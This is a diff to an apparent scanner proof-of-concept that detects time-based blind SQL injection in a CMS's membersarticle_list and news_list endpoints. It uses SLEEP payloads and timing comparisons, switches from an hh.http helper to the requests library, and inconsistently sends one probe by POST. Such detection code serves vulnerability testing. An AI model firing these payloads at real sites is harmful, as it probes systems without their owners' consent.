@@ -38,12 +38,13 @@ class Poc(ABPoc):
             payload1_0 = "/membersarticle_list/&membersarticleCategoryId=1' AND (SELECT * FROM (SELECT(SLEEP(0)))qoxp) AND 'KGia'='KGia.html"
             payload1_5 = "/membersarticle_list/&membersarticleCategoryId=1' AND (SELECT * FROM (SELECT(SLEEP(5)))qoxp) AND 'KGia'='KGia.html"
             time1_0 = time.time()
-            code0, head, res, errcode, _ = hh.http(self.target + payload1_0)
+            req = requests.get(self.target+payload1_0)
             time1_end_0 = time.time() - time1_0
             time1_5 = time.time()
-            code5, head, res, errcode, _ = hh.http(self.target + payload1_5)
+            req1 = requests.get(self.target+payload1_5)
             time1_end_5= time.time() - time1_5
-            if code0 == 200 and code5 == 200 and time1_end_5 - time1_end_0 > 4.5:
+
+            if req.status_code == 200 and req1.status_code == 200 and time1_end_5 - time1_end_0 > 4.5:
                 #security_hole(arg+payload1_5+ ' sql injection!')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -53,12 +54,12 @@ class Poc(ABPoc):
             payload2_5 = "/news_list/&newsCategoryId=6' AND (SELECT * FROM (SELECT(SLEEP(5)))qoxp) AND 'KGia'='KGia.html"
 
             time2_0 = time.time()
-            code0, head, res, errcode, _ = hh.http(self.target + payload1_0)
+            req = requests.get(self.target+payload2_0)
             time2_end_0 = time.time() - time2_0
             time2_5 = time.time()
-            code5, head, res, errcode, _ = hh.http(self.target + payload1_5)
+            req1 = requests.post(self.target+payload2_5)
             time2_end_5 = time.time() - time2_5
-            if code0 == 200 and code5 == 200 and time2_end_5 - time2_end_0 > 4.5:
+            if req.status_code == 200 and req1.status_code == 200 and time2_end_5 - time2_end_0 > 4.5:
                 #security_hole(arg+payload2_5+ ' sql injection!')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
